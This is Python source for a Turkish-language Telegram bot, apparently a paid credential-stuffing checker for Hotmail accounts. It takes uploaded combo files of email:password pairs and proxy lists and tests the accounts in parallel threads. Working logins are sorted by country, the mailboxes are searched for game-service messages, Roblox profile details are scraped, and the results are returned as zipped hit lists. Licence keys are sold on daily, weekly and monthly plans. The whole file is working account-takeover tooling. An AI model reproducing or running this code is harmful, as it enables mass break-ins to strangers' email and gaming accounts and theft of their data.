                    state["hit"] += 1
                    ulke = (c.country or "Unknown").upper().strip()
                    if not ulke or len(ulke) > 3:
                        ulke = "Unknown"
                    isim = c.name or ""
                    state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
                    state["all_hits_icerik"].append(combo)

                    if mesaj_info:
                        for game_key, m_info in mesaj_info.items():
                            sayi = m_info.get("sayi", 0)
                            if sayi and sayi > 0:
                                tarih = m_info.get("tarih", "N/A")
                                subj = m_info.get("subject", "")
                                prev = m_info.get("preview", "")
                                state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1

                                if game_key == "roblox":
                                    kullanici = roblox_eruu(prev + " " + subj)
                                    if kullanici:
                                        rd = roblox_rlll(kullanici, formatted_proxy)
                                        wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
                                        satir = (f"{combo} | {ulke} | {isim} | 🎲 ROBLOX | "
                                                 f"Username = {rd['username']} | Friends = {rd['friends']} | "
                                                 f"Banned = {rd['banned']} | Created = {rd['created']} | "
                                                 f"Profile = {rd['profile']} | Wearing = [{wearing}]")
                                    else:
                                        satir = (f"{combo} | {ulke} | {isim} | 🎲 ROBLOX | "
                                                 f"Username = ??? | Friends = ??? | Banned = ??? | "
                                                 f"Created = ??? | Profile = ??? | Wearing = []")
                                else:
                                    lbl = GAME_EMAILS[game_key]["label"]
                                    satir = f"{combo} | {ulke} | {isim} | {lbl} Messages: {sayi} | Last: {tarih}"
                                    if subj:
                                        satir += f" | Subject: {subj}"
                                    if prev:
                                        satir += f" | Preview: {prev}"

                                state["keyword_icerik"].setdefault(game_key, []).append(satir)
                                state["ulke_icerik"].setdefault(ulke, []).append(satir)
                                print(f"[HIT] {game_key} | {ulke} | {combo}", flush=True)

                elif status == "2FA":
                    state["twofa"] += 1
                    state["twofa_icerik"].append(combo)
                else:
                    state["bad"] += 1
        except Exception as e:
            with lock:
                state["errors"] += 1
            print(f"[CHECK ERROR] {e}", flush=True)
        finally:
            with lock:
                state["checked"] += 1
            semaphore.release()

    def progress_updater():
        while True:
            time.sleep(4)
            if tarama_durdur.get(chat_id, False):
                break
            with lock:
                checked = state["checked"]
            if checked >= dogrudogru:
                break
            with lock:
                hit = state["hit"]
                twofa = state["twofa"]
                bad = state["bad"]
                errors = state["errors"]
                kw_copy = dict(state["keyword_sayaci"])
                ulke_copy = dict(state["ulke_sayaci"])
            elapsed = time.time() - baslangic
            yuzde = (checked / dogrudogru) * 100 if dogrudogru > 0 else 0
            cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
            m = f"⚡️ Tarama Devam Ediyor!\n\n"
            m += f"📁 Dosya: {dosya_adi}\n📊 İlerleme: {checked}/{dogrudogru} (%{yuzde:.0f})\n\n"
            m += f"✔️ HIT: {hit}\n🔒 2FA: {twofa}\n❌ BAD: {bad}\n‼️ ERROR: {errors}\n\n"
            m += f"⏰ Süre: {int(elapsed)} sn\n⚡️ Ort. CPM: {int(cpm)}\n\n"
            if kw_copy:
                m += "🔖 KEYWORDS:\n"
                for k, v in sorted(kw_copy.items(), key=lambda x: -x[1]):
                    lbl = GAME_EMAILS[k]["label"] if k in GAME_EMAILS else k
                    m += f"🎯 {lbl}: {v} Hit (%{int(v/hit*100) if hit else 0})\n"
                m += "\n"
            if ulke_copy:
                m += "🌐 COUNTRIES:\n"
                for k, v in sorted(ulke_copy.items(), key=lambda x: -x[1])[:8]:
                    m += f"{get_flag(k)} {k}: {v} Hit (%{int(v/hit*100) if hit else 0})\n"
                m += "\n"
            m += "🛑 /stop ile durdurabilirsiniz"
            if progress_message_id:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                  data={"chat_id": chat_id, "message_id": progress_message_id, "text": m}, timeout=15)
                except:
                    pass

    updater = threading.Thread(target=progress_updater, daemon=True)
    updater.start()

    threads = []
    for combo in accounts:
        if tarama_durdur.get(chat_id, False):
            break
        semaphore.acquire()
        t = threading.Thread(target=check_one, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"[ZIP] all_hits={len(state['all_hits_icerik'])} 2fa={len(state['twofa_icerik'])} ulke={len(state['ulke_icerik'])} keyword={len(state['keyword_icerik'])}", flush=True)

    tarih = datetime.now().strftime('%d-%m-%Y')
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
            buf = io.StringIO()
            for line in state["all_hits_icerik"]:
                buf.write(line + "\n")
            zf.writestr("all_hits.txt", buf.getvalue())

            if state["twofa_icerik"]:
                buf = io.StringIO()
                for line in state["twofa_icerik"]:
                    buf.write(line + "\n")
                zf.writestr("2fa.txt", buf.getvalue())

            for kod, satirlar in state["ulke_icerik"].items():
                buf = io.StringIO()
                for line in satirlar:
                    buf.write(line + "\n")
                n = state["ulke_sayaci"].get(kod, len(satirlar))
                arc = f"countries/{kod} ({n} hit) ({tarih}).txt"
                zf.writestr(arc, buf.getvalue())
                print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)

            for svc, satirlar in state["keyword_icerik"].items():
                buf = io.StringIO()
                for line in satirlar:
                    buf.write(line + "\n")
                n = state["keyword_sayaci"].get(svc, len(satirlar))
                arc = f"keywords/{svc} ({n} hit) ({tarih}).txt"
                zf.writestr(arc, buf.getvalue())
                print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)
    except Exception as e:
        print(f"[ZIP ERROR] {e}", flush=True)

    try:
        with zipfile.ZipFile(ZIP_FILE, 'r') as zf_check:
            names = zf_check.namelist()
            print(f"[ZIP VERIFY] {len(names)} entries: {names}", flush=True)
    except Exception as e:
        print(f"[ZIP VERIFY ERROR] {e}", flush=True)

    ozet = f"✔️ {state['hit']}x Hotmail Hit\n\n"
    ozet += f"📊 Toplam Hit: {state['hit']}\n"
    for k, v in sorted(state["keyword_sayaci"].items(), key=lambda x: -x[1]):
        lbl = GAME_EMAILS[k]["label"] if k in GAME_EMAILS else k
        ozet += f"🎯 {lbl} Hit: {v}\n"
    ozet += f"🌐 Toplam Ülke: {len(state['ulke_sayaci'])}\n"
    ozet += f"🔒 2FA: {state['twofa']}\n\n"
    ozet += f"🔥 Hit By : @imkansizligim"
    send_message(chat_id, ozet)

    if os.path.exists(ZIP_FILE) and os.path.getsize(ZIP_FILE) > 0:
        send_document(chat_id, ZIP_FILE)

    if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
        kalan = len(bekleyen_hesaplar[chat_id]["accounts"])
        send_message(chat_id, f"📂 {kalan} more accounts. Type /devam")
    else:
        bekleyen_hesaplar.pop(chat_id, None)


# ============================================================
# TELEGRAM DÖNGÜSÜ
# ============================================================

def telegram_bot():
    global offset, ADMIN_THREAD, bakim_modu
    load_db()
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        data_cb = cb["data"]
                        if data_cb == "main_menu":
                            ana_menu(chat_id)
                        elif data_cb == "durum":
                            durum_menu(chat_id)
                        elif data_cb == "fiyatlar":
                            fiyat_menu(chat_id)
                        elif data_cb == "proxy":
                            proxy_menu(chat_id)
                        elif data_cb == "proxy_ekle":
                            proxy_waiting[chat_id] = True
                            send_message(chat_id, "📥 Send your proxy file.\nEach line: ip:port or ip:port:user:pass")
                        elif data_cb == "proxy_sil":
                            user_id = str(chat_id)
                            user_proxies.pop(user_id, None)
                            user_proxy_index.pop(user_id, None)
                            send_message(chat_id, "✅ Proxies removed.")
                            proxy_menu(chat_id)
                        elif data_cb == "baslat":
                            send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                        elif data_cb == "multi_start":
                            send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
                            multi_bekleyen[chat_id] = []
                        elif data_cb == "key_giris":
                            send_message(chat_id, "🔑 To enter key: /key LICENSE_KEY")
                        elif data_cb == "key_olustur":
                            if str(chat_id) == str(ADMIN_ID):
                                key_menu(chat_id)
                        elif data_cb == "key_daily":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("daily")
                                send_message(chat_id, f"✅ DAILY KEY\n\nKey: {key}")
                        elif data_cb == "key_weekly":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("weekly")
                                send_message(chat_id, f"✅ WEEKLY KEY\n\nKey: {key}")
                        elif data_cb == "key_monthly":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("monthly")
                                send_message(chat_id, f"✅ MONTHLY KEY\n\nKey: {key}")
                        elif data_cb == "thread_menu":
                            if str(chat_id) == str(ADMIN_ID):
                                thread_menu(chat_id)
                        elif data_cb.startswith("thread_"):
                            if str(chat_id) == str(ADMIN_ID):
                                ADMIN_THREAD = int(data_cb.split("_")[1])
                                send_message(chat_id, f"✅ Thread set to {ADMIN_THREAD}.")
                                ana_menu(chat_id)
                        continue
                    if "message" not in update:
                        continue
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    if "document" in msg:
                        file_id = msg["document"]["file_id"]
                        file_name = msg["document"].get("file_name", "combo.txt")
                        if chat_id in proxy_waiting:
                            content = download_file(file_id)
                            if content:
                                count = load_user_proxies(chat_id, content)
                                send_message(chat_id, f"✅ {count} proxies loaded!")
                            else:
                                send_message(chat_id, "❌ File could not be downloaded.")
                            del proxy_waiting[chat_id]
                            continue
                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
                            send_message(chat_id, "🔧 Maintenance mode.")
                            continue
                        if chat_id in multi_bekleyen:
                            multi_bekleyen[chat_id].append((file_id, file_name))
                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])}. /bitti")
                        else:
                            send_message(chat_id, "📂 File received, downloading...")
                            content = download_file(file_id)
                            if content is None:
                                send_message(chat_id, "❌ File could not be downloaded.")
                                continue
                            with open("uploaded_combo.txt", "w", encoding="utf-8") as f:
                                f.write(content)
                            accounts = cokludosyayukle(["uploaded_combo.txt"])
                            if not accounts:
                                send_message(chat_id, "❌ No valid accounts found.")
                                continue
                            plan_name = get_user_plan(chat_id)
                            plan_info = get_plan_info(plan_name)
                            single_limit = plan_info["single_limit"]
                            if single_limit > 0 and len(accounts) > single_limit:
                                bekleyen_hesaplar[chat_id] = {"accounts": accounts[single_limit:], "file_name": file_name}
                                send_message(chat_id, f"⚠️ First {single_limit}. Remaining: {len(accounts) - single_limit}. /devam")
                                accounts = accounts[:single_limit]
                            if plan_name == "free":
                                remaining = get_remaining_daily(chat_id)
                                if remaining <= 0:
                                    send_message(chat_id, "❌ DAILY LIMIT REACHED")
                                    continue
                                if len(accounts) > remaining:
                                    bekleyen_hesaplar[chat_id] = {"accounts": accounts[remaining:], "file_name": file_name}
                                    send_message(chat_id, f"⚠️ First {remaining}. Remaining: {len(accounts) - remaining}")
                                    accounts = accounts[:remaining]
                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning...")
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(accounts)
                                save_db()
                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                            t.start()
                    elif msg.get("text") == "/start":
                        ana_menu(chat_id)
                    elif msg.get("text") == "/proxy":
                        proxy_menu(chat_id)
                    elif msg.get("text") == "/stop":
                        tarama_durdur[chat_id] = True
                        send_message(chat_id, "⏹️ Stopping scan...")
                    elif msg.get("text") == "/durum":
                        durum_menu(chat_id)
                    elif msg.get("text") == "/rapor":
                        rapor(chat_id)
                    elif msg.get("text") == "/keyler":
                        keyler_listesi(chat_id)
                    elif msg.get("text") == "/bakim":
                        bakim(chat_id)
                    elif msg.get("text") == "/thread":
                        thread_menu(chat_id)
                    elif msg.get("text") == "/devam":
                        if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
                            kalan = bekleyen_hesaplar[chat_id]["accounts"]
                            fname = bekleyen_hesaplar[chat_id]["file_name"]
                            del bekleyen_hesaplar[chat_id]
                            send_message(chat_id, f"🔱 Continuing with {len(kalan)} accounts...")
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(kalan)
                                save_db()
                            t = threading.Thread(target=tarama_yap, args=(chat_id, kalan, fname), daemon=True)
                            t.start()
                        else:
                            send_message(chat_id, "❌ No remaining accounts.")
                    elif msg.get("text", "").startswith("/keyiptal "):
                        if str(chat_id) == str(ADMIN_ID):
                            key = msg["text"].replace("/keyiptal", "").strip()
                            if key in keys_db:
                                del keys_db[key]
                                save_db()
                                send_message(chat_id, f"✅ Key deleted: {key}")
                    elif msg.get("text", "").startswith("/key "):
                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
                            send_message(chat_id, "🔧 Maintenance mode.")
                            continue
                        key = msg["text"].split(" ", 1)[1].strip() if " " in msg["text"] else ""
                        if key in keys_db:
                            kd = keys_db[key]
                            if kd.get("expires"):
                                expiry = datetime.fromisoformat(kd["expires"])
                                if expiry <= datetime.now():
                                    send_message(chat_id, "❌ Key expired.")
                                    continue
                            if kd.get("bound_to") and str(kd["bound_to"]) != str(chat_id):
                                send_message(chat_id, "❌ Key bound to another account.")
                                continue
                            keys_db[key]["bound_to"] = str(chat_id)
                            if not kd.get("expires"):
                                dur = PLANS[kd["type"]]["duration"]
                                if dur:
                                    keys_db[key]["expires"] = (datetime.now() + timedelta(hours=dur)).isoformat()
                            uid = str(chat_id)
                            if uid not in users_db:
                                users_db[uid] = {}
                            users_db[uid]["plan"] = kd["type"]
                            users_db[uid]["key_expires"] = keys_db[key]["expires"]
                            users_db[uid]["daily_used"] = 0
                            users_db[uid]["last_reset"] = datetime.now().strftime('%Y-%m-%d')
                            save_db()
                            pi = get_plan_info(kd["type"])
                            send_message(chat_id, f"✅ KEY ACTIVATED\n📋 Plan: {pi['name']}")
                        else:
                            send_message(chat_id, "❌ Invalid key.")
                    elif msg.get("text", "").startswith("/duyuru"):
                        if str(chat_id) == str(ADMIN_ID):
                            m = msg["text"].replace("/duyuru", "").strip()
                            if m:
                                duyuru(chat_id, m)
                    elif msg.get("text") == "/bitti":
                        if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                            send_message(chat_id, "📂 Merging files...")
                            tum = []
                            for fid, fname in multi_bekleyen[chat_id]:
                                content = download_file(fid)
                                if content:
                                    with open(f"multi_{fid}.txt", "w", encoding="utf-8") as f:
                                        f.write(content)
                                    tum.extend(cokludosyayukle([f"multi_{fid}.txt"]))
                            benzersiz = list(dict.fromkeys(tum))
                            if not benzersiz:
                                send_message(chat_id, "❌ No valid accounts.")
                                del multi_bekleyen[chat_id]
                                continue
                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning...")
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(benzersiz)
                                save_db()
                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                            t.start()
                            del multi_bekleyen[chat_id]
                        else:
                            send_message(chat_id, "❌ Start Multi Scan first.")
        except Exception as e:
            print(f"[LOOP ERROR] {e}", flush=True)
            time.sleep(5)


if __name__ == "__main__":
    print("Bot started!")
    telegram_bot()
